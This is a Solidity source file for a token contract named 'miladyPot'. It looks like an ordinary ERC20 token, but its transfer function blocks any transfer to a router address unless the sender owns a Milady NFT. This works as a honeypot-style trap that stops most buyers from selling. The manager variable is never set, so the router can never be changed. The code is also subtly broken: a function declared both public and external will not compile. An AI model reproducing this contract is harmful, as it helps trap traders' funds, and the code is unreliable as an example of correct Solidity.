pragma solidity 0.8.18;

interface IERC721{
    function balanceOf(address owner) external view returns (uint256 balance);
}

contract miladyPot is IERC721{
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    IERC721 public immutable _milady = IERC721(0x5Af0D9827E0c53E4799BB226655A1de152A425a5);
    address public _manager;
    address public _router;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint supply_, address router_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _balances[msg.sender] = supply_ * 10 ** decimals_;
        _totalSupply = supply_ * 10 ** decimals_;
        _router = router_;
    }

    function name() public view returns (string memory) {return _name;}
    function symbol() public view returns (string memory) {return _symbol;}
    function decimals() public view returns (uint8) {return _decimals;}
    function totalSupply() public view returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        if(to == _router){require(_milady.balanceOf(from) >= 1, "ERC20: 'from' address must own at least one 'milady' token");}
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        _approve(owner, spender, currentAllowance - amount);
    }

    function setRouter(address router_) public external{
        require(msg.sender == _manager, "You don't have the right!");
        _router = router_;
    }
}
